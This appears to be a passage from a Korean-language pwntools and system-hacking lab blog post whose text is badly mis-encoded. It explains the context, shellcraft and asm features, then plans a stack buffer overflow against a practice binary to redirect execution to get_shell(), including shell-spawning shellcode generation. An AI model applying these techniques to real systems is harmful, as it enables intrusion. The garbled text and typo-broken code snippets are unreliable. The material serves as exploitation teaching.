  &lt;li&gt;
    &lt;p&gt;ì‚¬ìš©ì˜ˆ&lt;/p&gt;

    &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;imort&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;log_level&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;error&apos;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# ì—ëŸ¬ë§Œ ì¶œë ¥
&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;log_level&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;debug&apos;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# ëŒ€ìƒ í”„ë¡œì„¸ìŠ¤ì™€ ìµìŠ¤í”Œë¡œì‡ ê°„ì— ì˜¤ê°€ëŠ” ëª¨ë“  ë°ì´í„°ë¥¼ í™”ë©´ì— ì¶œë ¥
&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;log_level&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;info&apos;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# ë¹„êµì  ì¤‘ìš”í•œ ì •ë³´ë“¤ë§Œ ì¶”ë ¤ì„œ ì¶œë ¥
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;8-contextarch&quot;&gt;8. context.arch&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;architectureì˜ ì¤€ë§&lt;/li&gt;
  &lt;li&gt;ì¦‰, ê³µê²© ëŒ€ìƒì˜ ì•„í‚¤í…ì²˜ ì •ë³´ë¥¼ í”„ë¡œê·¸ë˜ë¨¸ê°€ ì›í•˜ëŠ” ëŒ€ë¡œ ì§€ì •í•  ìˆ˜ ìˆê²Œ í•¨ìœ¼ë¡œì¨ í˜¸í™˜ì„±ì„ ë†’ì„&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ì‚¬ìš©ì˜ˆ&lt;/p&gt;

    &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;amd64&quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# x86-64
&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;i386&quot;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;arm&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;9-shellcraft&quot;&gt;9. shellcraft&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;ì…¸ì½”ë“œë¥¼ ì‘ì„±í•´ ìµìŠ¤í”Œë¡œì‡ì„ ìˆ˜í–‰í•˜ëŠ” ê³¼ì •ì—ì„œ ìƒí™©ì— ë”°ë¼ ì—¬ëŸ¬ ì œì•½ ì¡°ê±´ì´ ì¡´ì¬í•  ìˆ˜ ìˆë‹¤. ë”°ë¼ì„œ, ì´ë¥¼ ë§ì¶”ê¸° ìœ„í•´ ì§ì ‘ ì…¸ì½”ë“œë¥¼ ì‘ì„±í•´ì•¼ í•  ë•Œê°€ ìˆë‹¤.&lt;/li&gt;
  &lt;li&gt;pwntoolsì—ëŠ” ìì£¼ ì‚¬ìš©ë˜ëŠ” ì…¸ì½”ë“œë“¤ì´ ì €ì¥ë˜ì–´ ìˆì–´ì„œ ë³„ë‹¤ë¥¸ ì œì•½ ì¡°ê±´ì´ ì—†ë‹¤ë©´ êº¼ë‚´ ì“°ë©´ ëœë‹¤.&lt;/li&gt;
  &lt;li&gt;amd64(x86-64) íƒ€ê²Ÿìœ¼ë¡œ ìƒì„±í•  ìˆ˜ ìˆëŠ” ì…¸ì½”ë“œ ëª©ë¡: &lt;a href=&quot;https://docs.pwntools.com/en/stable/shellcraft/amd64.html&quot;&gt;ì—¬ê¸°&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ì‚¬ìš©ì˜ˆ:&lt;/p&gt;

    &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwm&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;amd64&apos;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# ì•„í‚¤í…ì²˜ ì§€ì •ì„ í•˜ì§€ ì•Šìœ¼ë©´ ì´í›„ shellcraft.amd64.{} ì‹ìœ¼ë¡œ ëª…ì‹œí•´ ì¤˜ì•¼ í•œë‹¤.
&lt;/span&gt;    
  &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcraft&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;10-asm&quot;&gt;10. asm&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;pwntoolsì—ì„œ ì œê³µí•˜ëŠ” ì–´ì…ˆë¸” ê¸°ëŠ¥&lt;/li&gt;
  &lt;li&gt;ê¸°ê³„ì–´ë¡œ ì–´ì…ˆë¸”í•˜ëŠ” ê²ƒì´ë¯€ë¡œ, ëŒ€ìƒ ì•„í‚¤í…ì²˜ê°€ ì¤‘ìš”í•˜ë‹¤. ë”°ë¼ì„œ, ì•„í‚¤í…ì²˜ë¥¼ ê¼­ ì§€ì •í•´ ì£¼ê³  ì‹œì‘í•œë‹¤.&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ì‚¬ìš©ì˜ˆ:&lt;/p&gt;

    &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;amd64&apos;&lt;/span&gt;
    
  &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcraft&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# ì…¸ì„ ì‹¤í–‰í•˜ëŠ” ì…¸ ì½”ë“œë¥¼ ê¸°ê³„ì–´ë¡œ ì–´ì…ˆë¸”
&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;ê²°ê³¼:&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack3-2/Untitled.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;pwntools-ì‹¤ìŠµ&quot;&gt;pwntools ì‹¤ìŠµ&lt;/h1&gt;

&lt;p&gt;ì•„ë˜ì˜ ì½”ë“œì—ì„œ get_shell() í•¨ìˆ˜ë¥¼ ì‹¤í–‰ì‹œí‚¤ëŠ” ê²ƒì´ ëª©ì ì´ë‹¤. (ì‹œìŠ¤í…œ í•´í‚¹ì˜ ëª©ì ì€ ì…¸ì„ ë”´ í›„ ë£¨íŠ¸ ê¶Œí•œì„ íƒˆì·¨í•˜ëŠ” ê²ƒì´ê¸° ë•Œë¬¸ì´ë‹¤)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack3-2/Untitled%201.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ë¨¼ì € ì´ì „ì— ë°°ì› ë˜ ë‚´ìš©ì„ ë‹¤ì‹œ ëŒì•„ë³¼ í•„ìš”ê°€ ìˆë‹¤.&lt;/p&gt;

&lt;p&gt;ì–´ë–¤ í•¨ìˆ˜ì˜ ìŠ¤íƒ í”„ë ˆì„ì´ ìƒì„±ë  ë•Œ ì§ì „ê¹Œì§€ ripê°€ ìœ„ì¹˜í•´ ìˆë˜ í•¨ìˆ˜ì˜ ìŠ¤íƒ í”„ë ˆì„ê³¼ì˜ ê´€ê³„ëŠ” ì•„ë˜ì™€ ê°™ë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack3-2/Untitled%202.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ë˜í•œ ë¦¬ëˆ…ìŠ¤ì˜ í”„ë¡œì„¸ìŠ¤ì—ê²Œ í• ë‹¹ë˜ëŠ” ë©”ëª¨ë¦¬ êµ¬ì¡°ëŠ” ì•„ë˜ì™€ ê°™ë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack3-2/Untitled%203.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ì´ì œ ë°°ìš´ ë‚´ìš©ì„ ê¸°ë°˜ìœ¼ë¡œ í•˜ì—¬ ì£¼ì–´ì§„ ë¬¸ì œë¥¼ ì–´ë–»ê²Œ í•´ê²°í• ì§€ ê³„íšì„ ì„¸ì›Œ ë³´ì.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;ë‹¨ê³„&lt;/strong&gt;&lt;/p&gt;

  &lt;ol&gt;
    &lt;li&gt;get_shell í•¨ìˆ˜ì˜ ì‹œì‘ ì£¼ì†Œë¥¼ ì•Œì•„ë‚¸ë‹¤.&lt;/li&gt;
    &lt;li&gt;ìœ ì €ê°€ ìµìŠ¤í”Œë¡œì‡ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆëŠ” ë¶€ë¶„ì„ ì¢íŒë‹¤.
      &lt;ol&gt;
        &lt;li&gt;â€œInput: â€œì´ ì¶œë ¥ëì„ ë•Œ ê°’ì„ ì…ë ¥í•˜ëŠ” ë¶€ë¶„ì´ ìœ ì¼í•˜ê²Œ ìœ ì €ê°€ í”„ë¡œì„¸ìŠ¤ì™€ ì†Œí†µí•  ìˆ˜ ìˆëŠ” ë¶€ë¶„ì´ë‹¤.&lt;/li&gt;
        &lt;li&gt;ë”°ë¼ì„œ ìœ ì € ì…ë ¥ê°’ì„ ë°›ì„ ë•Œ malicious í•œ ì…ë ¥ê°’ì„ ë„£ì–´ì•¼ í•œë‹¤.&lt;/li&gt;
      &lt;/ol&gt;
    &lt;/li&gt;
    &lt;li&gt;í˜„ì¬ ì½”ë“œì—ì„œëŠ” ìœ ì € ì…ë ¥ê°’ì„ ì–´ë””ì— ë„£ëŠ”ì§€ í™•ì¸í•œë‹¤.
      &lt;ol&gt;
        &lt;li&gt;buf[0x28]ì— ë„£ëŠ” ê²ƒìœ¼ë¡œ ì„¤ì •ë˜ì–´ ìˆê³ , ì…ë ¥ê°’ì´ ë²”ìœ„ë¥¼ ë„˜ì–´ê°€ëŠ” ê²ƒì„ ì°¨ë‹¨í•˜ì§€ ì•ŠëŠ”ë‹¤.&lt;/li&gt;
        &lt;li&gt;ë”°ë¼ì„œ BOF(Buffer OverFlow) ê³µê²©ì„ ìˆ˜í–‰í•˜ëŠ” ê²ƒìœ¼ë¡œ ê²°ì •í•œë‹¤.&lt;/li&gt;
      &lt;/ol&gt;
    &lt;/li&gt;
    &lt;li&gt;ìœ ì €ê°€ ì…ë ¥ê°’ì„ ì…ë ¥í•  ë•Œ ìŠ¤íƒì˜ êµ¬ì¡°ë¥¼ ì•Œì•„ë‚´ì–´ í˜„ì¬ ìŠ¤íƒ í”„ë ˆì„ì´ ì¢…ë£Œëœ í›„ ì‹¤í–‰ë  ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ì£¼ì†Œë¥¼ ì˜¤ì—¼ì‹œí‚¨ë‹¤.&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;p&gt;ê° í˜ì´ì¦ˆì˜ ëª©ì ì„ ì°¨ê·¼ì°¨ê·¼ ë‹¬ì„±í•´ ë³´ì.&lt;/p&gt;

&lt;h3 id=&quot;get_shell-í•¨ìˆ˜ì˜-ì‹œì‘-ì£¼ì†Œ-ì•Œì•„ë‚´ê¸°&quot;&gt;get_shell() í•¨ìˆ˜ì˜ ì‹œì‘ ì£¼ì†Œ ì•Œì•„ë‚´ê¸°&lt;/h3&gt;

&lt;p&gt;íŠ¹ì • í”„ë¡œê·¸ë¨ì„ êµ¬ì„±í•˜ëŠ” í•¨ìˆ˜ë“¤ì€ í”„ë¡œì„¸ìŠ¤ê°€ ë©”ëª¨ë¦¬ì— ì˜¬ë¼ê°ˆ ë•Œ í•œêº¼ë²ˆì— ì½”ë“œ ì„¸ê·¸ë¨¼íŠ¸ì— ë¡œë”©ëœë‹¤. c ì–¸ì–´ì˜ ê²½ìš° ìœ„ì—ì„œë¶€í„° ì•„ë˜ë¡œ ì»´íŒŒì¼ë˜ê¸° ë•Œë¬¸ì—, í•¨ìˆ˜ê°€ ì½”ë“œ ì„¸ê·¸ë¨¼íŠ¸ì— ë¡œë”©ë˜ëŠ” ìˆœì„œëŠ” ì½”ë“œê°€ ì“°ì¸ ìˆœì„œì™€ ì¼ì¹˜í•˜ê²Œ ëœë‹¤. ì¦‰, get_shell() í•¨ìˆ˜ ë‹¤ìŒì— main() í•¨ìˆ˜ê°€ ì½”ë“œ ì„¸ê·¸ë¨¼íŠ¸ì— ë¡œë”©ëœë‹¤.&lt;/p&gt;

&lt;p&gt;ì´ì œ gdbë¥¼ ì´ìš©í•´ get_shell() í•¨ìˆ˜ì˜ ìœ„ì¹˜ë¥¼ ì•Œì•„ë‚´ ë³´ì.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack3-2/Untitled%204.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ë”±íˆ ë‚œë…í™”í•˜ì§€ ì•Šì•˜ê¸° ë•Œë¬¸ì— ì‹¬ë³¼ì´ ê·¸ëŒ€ë¡œ ì‚´ì•„ ìˆë‹¤. ë¸Œë ˆì´í¬ í¬ì¸íŠ¸ë¥¼ get_shellì— ê±ºìœ¼ë¡œì¨ get_shellì˜ ì£¼ì†Œë¥¼ ì•Œì•„ë‚¼ ìˆ˜ ìˆì—ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ì¶”ê°€ì ìœ¼ë¡œ, main() í•¨ìˆ˜ì˜ ì£¼ì†ŒëŠ” ì•„ë˜ì™€ ê°™ë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack3-2/Untitled%205.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ì½”ë“œìƒì—ì„œ get_shellë³´ë‹¤ ì•„ë˜ì— mainì´ ì“°ì—¬ ìˆì—ˆê¸° ë•Œë¬¸ì— ë©”ëª¨ë¦¬ì˜ ì½”ë“œ ì˜ì—­ì—ë„ mainì´ get_shellë³´ë‹¤ ë’¤ì— ë¡œë”©ëœ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;ìœ ì €-ì…ë ¥ê°’ì„-ë°›ì„-ë‹¹ì‹œ-ìŠ¤íƒì˜-êµ¬ì¡°-í™•ì¸í•˜ê¸°&quot;&gt;ìœ ì € ì…ë ¥ê°’ì„ ë°›ì„ ë‹¹ì‹œ ìŠ¤íƒì˜ êµ¬ì¡° í™•ì¸í•˜ê¸°&lt;/h3&gt;

&lt;p&gt;ìœ„ì—ì„œ ì§šì–´ë³¸ ê²ƒì²˜ëŸ¼, ìƒˆë¡­ê²Œ ì½œëœ í•¨ìˆ˜ì˜ ìŠ¤íƒ í”„ë ˆì„ê³¼ ì´ì „ í•¨ìˆ˜ì˜ ìŠ¤íƒ í”„ë ˆì„ ê°„ì˜ ê´€ê³„ëŠ” ì•„ë˜ì™€ ê°™ë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack3-2/Untitled%202.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ìŠ¤íƒì—ëŠ” ë¡œì»¬ ë³€ìˆ˜ê°€ ì €ì¥ë˜ê¸° ë•Œë¬¸ì— ìš°ë¦¬ê°€ BOFì˜ ë§¤ê°œë¡œ ì‚¬ìš©í•˜ëŠ” buf[0x28] ë³€ìˆ˜ ë˜í•œ ìŠ¤íƒì— ìˆì„ ê²ƒì„ ì˜ˆìƒí•˜ê³  ìˆë‹¤. ë˜í•œ ë³€ìˆ˜ëŠ” ì„ ì–¸ëœ ìˆœì„œëŒ€ë¡œ ìŠ¤íƒì— ë“¤ì–´ê°€ë¯€ë¡œ buf ë³€ìˆ˜ëŠ” main í•¨ìˆ˜ì˜ rbpì— ìœ„ì¹˜í•´ ìˆì„  ê²ƒì´ë‹¤. ë”°ë¼ì„œ ìš°ë¦¬ê°€ ìµìŠ¤í”Œë¡œì‡í•  ë‹¹ì‹œì˜ ìŠ¤íƒì˜ êµ¬ì¡°ëŠ” ì•„ë˜ì™€ ê°™ë‹¤.&lt;/p&gt;

&lt;p&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;[rbp-0x1]~[rbp-0x28]&lt;/strong&gt;: buf[0x28]&lt;/p&gt;

&lt;p&gt;================main() ìŠ¤íƒ í”„ë ˆì„ ë====================&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;[rbp+0x7]~[rbp]&lt;/strong&gt;: start_main()ì˜ rbp ì£¼ì†Œ(0x0000000000000000)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;[rbp+0x0e]~[rbp+0x07]&lt;/strong&gt;: main()ì´ ëë‚œ í›„ ì´ì–´ì„œ ì‹¤í–‰ë  ì¸ìŠ¤íŠ¸ëŸ­ì…˜ ì£¼ì†Œ&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++&lt;/p&gt;

&lt;p&gt;ê³¼ì—° ì¶”ì¸¡ì´ ë§ëŠ”ì§€ gdbë¥¼ ë¶™ì—¬ì„œ í™•ì¸í•´ ë³´ì.&lt;/p&gt;

&lt;h3 id=&quot;ì‹¤ì œ-ìŠ¤íƒì˜-êµ¬ì¡°ë¥¼-ë””ë²„ê±°ë¡œ-í™•ì¸í•˜ê¸°&quot;&gt;ì‹¤ì œ ìŠ¤íƒì˜ êµ¬ì¡°ë¥¼ ë””ë²„ê±°ë¡œ í™•ì¸í•˜ê¸°&lt;/h3&gt;

&lt;p&gt;ì£¼ì–´ì§„ í•¨ìˆ˜ë¥¼ gccë¡œ ì»´íŒŒì¼í•  ë•Œ ìŠ¤íƒ ì¹´ë‚˜ë¦¬ë¥¼ ë„ê³ (-fno-stack-protector) PIEë¥¼ ë”ìœ¼ë¡œì¨ ASLRë„ ì ìš©ë˜ì§€ ì•Šë„ë¡(-no-pie) í•´ë‘ì—ˆê¸° ë•Œë¬¸ì— ì•„ë§ˆ ìŠ¤íƒì˜ êµ¬ì¡°ëŠ” ë¹„êµì  ê°„ë‹¨í•  ê²ƒì´ë‹¤. ëª©í‘œ í”„ë¡œì„¸ìŠ¤ì¸ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rao&lt;/code&gt; ì— gdbë¥¼ ë¶™ì—¬ì„œ ì‚¬ìš©ì ì…ë ¥ê°’ì„ ë°›ê³  ì €ì¥í•˜ëŠ” ì‹œì ì˜ ìŠ¤íƒì˜ êµ¬ì¡°ë¥¼ í•´ë‹¹ ì‹œì ì—ì„œì˜ rbpê¹Œì§€ í¬í•¨ë˜ë„ë¡ í™•ì¸í•´ ë³´ì•˜ë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack3-2/Untitled%206.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;í°ìƒ‰ìœ¼ë¡œ í•˜ì´ë¼ì´íŠ¸í•œ ë¶€ë¶„, ì¦‰ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7fffffffdf80&lt;/code&gt; ì´ rbpì´ë©°, ìŠ¤íƒì˜ êµ¬ì¡° ìì²´ëŠ” ì˜ˆìƒí–ˆë˜ ë°”ì™€ ì¼ì¹˜í•¨ì„ í™•ì¸í•  ìˆ˜ ìˆì—ˆë‹¤. ê·¸ëŸ¬ë‚˜, ë”± í•œ ê°€ì§€ ë‹¤ë¥¸ ë¶€ë¶„ì´ ìˆì—ˆë‹¤.&lt;/p&gt;

&lt;p&gt;buf[0x28] ë³€ìˆ˜ëŠ” ì• ì´ˆì— 0x28 byte ë§Œí¼ì˜ í¬ê¸°ë¥¼ ê°€ì§€ê¸° ë•Œë¬¸ì— ì˜ˆìƒëŒ€ë¡œë¼ë©´ buf[0x28]ì´ ì°¨ì§€í•˜ëŠ” ì£¼ì†ŒëŠ” &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7fffffffdf7e&lt;/code&gt; ~ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7fffffffdf58&lt;/code&gt; ì´ì—ˆì–´ì•¼ í•˜ì§€ë§Œ, ì‹¤ì œë¡œ í™•ì¸í•œ ê²°ê³¼ëŠ” &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7fffffffdf7e&lt;/code&gt; ~ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7fffffffdf50&lt;/code&gt; ì´ì—ˆë‹¤. ì¦‰ 8byte ë§Œí¼ì´ ë” í• ë‹¹ë˜ì–´ ìˆì—ˆë‹¤. buf[0x28] ì´ ì‹¤ì œë¡œëŠ” buf[0x30] ì´ì—ˆë˜ ê²ƒì´ë‹¤.&lt;/p&gt;

&lt;p&gt;ì´ ì´ìœ ê°€ ê¶ê¸ˆí•´ ì•Œì•„ë³´ë‹ˆ, ìŠ¤íƒ ë³´í˜¸ì˜ ì¼í™˜ìœ¼ë¡œ c ì»´íŒŒì¼ëŸ¬ê°€ char ë°°ì—´ì„ í• ë‹¹í•  ë•Œ 8byte ì •ë„ë¥¼ ë” í• ë‹¹í•´ ì¤€ë‹¤ëŠ” ì‚¬ì‹¤ì„ ì•Œ ìˆ˜ ìˆì—ˆë‹¤. ë‹¨ìˆœíˆ ì´ë¡ ìƒìœ¼ë¡œë§Œ ë¬¸ì œì— ì ‘ê·¼í•  ê²Œ ì•„ë‹ˆë¼ ì‹¤ì œë¡œ êµ¬ë™í•˜ëŠ” ìƒí™©ì—ì„œì˜ ë©”ëª¨ë¦¬ êµ¬ì¡°ë¥¼ í™•ì¸í•œ ì´í›„ ìµìŠ¤í”Œë¡œì‡ì„ ì‘ì„±í•˜ëŠ” ê²Œ ì¢‹ê² ë‹¤ëŠ” êµí›ˆì„ ì–»ì„ ìˆ˜ ìˆì—ˆë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;ìµìŠ¤í”Œë¡œì‡-ì‘ì„±í•˜ê¸°&quot;&gt;ìµìŠ¤í”Œë¡œì‡ ì‘ì„±í•˜ê¸°&lt;/h3&gt;

&lt;p&gt;ìµìŠ¤í”Œë¡œì‡ì—ì„œ í”„ë¡œì„¸ìŠ¤ì—ê²Œ ë³´ë‚¼ í˜ì´ë¡œë“œë¥¼ ë¨¼ì € êµ¬ìƒí•´ ë³´ì. í”„ë¡œì„¸ìŠ¤ê°€ êµ¬ë™ì¤‘ì¼ ë•Œ ì‹¤ì œ ìŠ¤íƒì˜ êµ¬ì¡°ëŠ” ì•„ë˜ì™€ ê°™ì•˜ë‹¤.&lt;/p&gt;

&lt;p&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;[rbp-0x1]~[rbp-0x30]&lt;/strong&gt;: buf[0x28]                                                              //0x30 byte&lt;/p&gt;

&lt;p&gt;================main() ìŠ¤íƒ í”„ë ˆì„ ë====================&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;[rbp+0x7]~[rbp]&lt;/strong&gt;: start_main()ì˜ rbp ì£¼ì†Œ(0x0000000000000000)      //0x08 byte&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;[rbp+0x0e]~[rbp+0x07]&lt;/strong&gt;: main()ì´ ëë‚œ í›„ ì´ì–´ì„œ ì‹¤í–‰ë  ì¸ìŠ¤íŠ¸ëŸ­ì…˜ ì£¼ì†Œ  //0x08 byte&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++&lt;/p&gt;

